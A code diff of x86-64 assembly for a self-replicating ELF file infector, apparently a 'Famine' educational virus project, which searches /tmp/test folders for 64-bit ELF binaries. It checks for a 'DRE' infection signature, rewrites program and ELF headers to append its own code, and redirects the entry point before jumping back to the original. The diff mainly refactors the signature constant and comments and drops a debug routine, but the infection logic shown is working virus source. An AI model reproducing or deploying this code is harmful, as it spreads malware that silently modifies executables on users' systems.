@@ -26,38 +26,40 @@
 
 %define argv0			[rsp + 8]
 %define argc			[rsp + 4]
-
+%define SIGNATURE		0x00455244
 
 %define PF_X	1
 %define PF_R	4
-; r15 + 0 = stack buffer = stat
-; r15 + 48 = stat.st_size
 
-; r15 + 144 = ehdr
-; r15 + 148 = ehdr.class
-; r15 + 152 = ehdr.pad
-; r15 + 168 = ehdr.entry
-; r15 + 176 = ehdr.phoff
-; r15 + 198 = ehdr.phentsize
-; r15 + 200 = ehdr.phnum
+; ***  r15 offsets  ****
+; 0 = stack buffer = stat
+; 48 = stat.st_size
 
-; r15 + 208 = phdr = phdr.type
-; r15 + 212 = phdr.flags
-; r15 + 216 = phdr.offset
-; r15 + 224 = phdr.vaddr
-; r15 + 232 = phdr.paddr
-; r15 + 240 = phdr.filesz
-; r15 + 248 = phdr.memsz
-; r15 + 256 = phdr.align
+; 144 = ehdr
+; 148 = ehdr.class
+; 152 = ehdr.pad
+; 168 = ehdr.entry
+; 176 = ehdr.phoff
+; 198 = ehdr.phentsize
+; 200 = ehdr.phnum
 
-; r15 + 300 = jmp rel
+; 208 = phdr = phdr.type
+; 212 = phdr.flags
+; 216 = phdr.offset
+; 224 = phdr.vaddr
+; 232 = phdr.paddr
+; 240 = phdr.filesz
+; 248 = phdr.memsz
+; 256 = phdr.align
 
-; r15 + 350 = directory size
+; 300 = jmp rel
 
-; r15 + 400 = dirent = dirent.d_ino
-; r15 + 416 = dirent.d_reclen
-; r15 + 418 = dirent.d_type
-; r15 + 419 = dirent.d_name
+; 350 = directory size
+
+; 400 = dirent = dirent.d_ino
+; 416 = dirent.d_reclen
+; 418 = dirent.d_type
+; 419 = dirent.d_name
 
 section .text
 	global _start
@@ -127,7 +129,7 @@ _start:
 			cmp byte [r15 + 148], 2                    ; check if target ELF is 64bit
 			jne .close_file
         .is_infected:
-            cmp dword [r15 + 152], 0x00455244                   ; check signature in [r15 + 152] ehdr.pad (DRE in little-endian, plus trailing zero to fill up a word size)
+            cmp dword [r15 + 152], SIGNATURE                   ; check signature in [r15 + 152] ehdr.pad (DRE in little-endian, plus trailing zero to fill up a word size)
             jz .close_file   
 		mov r8, [r15 + 176]                                 ; r8 now holds ehdr.phoff from [r15 + 176]
 		xor rbx, rbx                                        ; initializing phdr loop counter in rbx
@@ -153,7 +155,6 @@ _start:
 			jnz .loop_phdr                                      ; read next phdr
 
 		.infect:
-
 			.get_target_phdr_file_offset:
 				mov ax, bx                                      ; loading phdr loop counter bx to ax
 				mov dx, word [r15 + 198]                        ; loading ehdr.phentsize from [r15 + 198] to dx
@@ -204,8 +205,7 @@ _start:
                 add qword [r15 + 240], _end - _start + 5     ; add virus size to phdr.filesz in [r15 + 240] + 5 for the jmp to original ehdr.entry
                 add qword [r15 + 248], _end - _start + 5     ; add virus size to phdr.memsz in [r15 + 248] + 5 for the jmp to original ehdr.entry
 
-                ; writing patched phdr
-                mov rdi, r9                                     ; r9 contains fd
+                mov rdi, r9                                     ; fd
                 mov rsi, r15                                    ; rsi = r15 = stack buffer address
                 lea rsi, [r15 + 208]                            ; rsi = phdr = [r15 + 208]
                 mov dx, word [r15 + 198]                        ; ehdr.phentsize from [r15 + 198]
@@ -217,13 +217,10 @@ _start:
                 jle .close_file
 
             .patch_ehdr:
-                ; patching ehdr
                 mov r14, [r15 + 168]                            ; storing target original ehdr.entry from [r15 + 168] in r14
                 mov [r15 + 168], r13                            ; set ehdr.entry in [r15 + 168] to r13 (phdr.vaddr)
-                mov r13, 0x00455244                             ; loading DRE signature
+                mov r13, SIGNATURE                             ; loading DRE signature
                 mov [r15 + 152], r13                            ; adding the virus signature to ehdr.pad in [r15 + 152]
-
-                ; writing patched ehdr
                 mov rdi, r9                                     ; r9 contains fd
                 lea rsi, [r15 + 144]                            ; rsi = ehdr = [r15 + 144]
                 mov rdx, 64                              ; ehdr.size
@@ -262,10 +259,8 @@ _start:
                 mov rax, SYS_SYNC                               ; commiting filesystem caches to disk
                 syscall
 		.close_file:
-
 			mov rax, SYS_CLOSE                                  ; close source fd in rdi
 			syscall
-			
 		.continue:
 			pop rcx
 			add cx, word [rcx + r15 + 416]
@@ -273,15 +268,6 @@ _start:
 			jne for_each_file
 
 		jmp cleanup
-print_dot:
-	push rbx
-	mov rdi, 1
-	mov rsi, r14
-	mov rdx, 1
-	mov rax, 0x1
-	syscall
-	pop rbx
-	ret
 set_folder:
 	call dirent
 	db "/tmp/test", 0
@@ -292,19 +278,15 @@ set_folder2:
 	call chdir
 	db `/tmp/test2\0`
 famine:
-	db 'famine v1.0 by darodrig', 0
+	db 'F4M1N3 v1.0 by darodrig', 0
 err:
 	mov rax, SYS_EXIT
 	mov rdi, 0xfffffff
 	syscall
 cleanup:
-
-	mov rax, SYS_GETUID
-	syscall
-    add rsp, 5008                                               ; restoring stack so host process can run normally, this also could use some improvement
+    add rsp, 5008       ; restoring stack 
     pop rsp
     pop rdx
-	jmp _end
 _end:
 	xor rdi, rdi
 	mov rax, SYS_EXIT
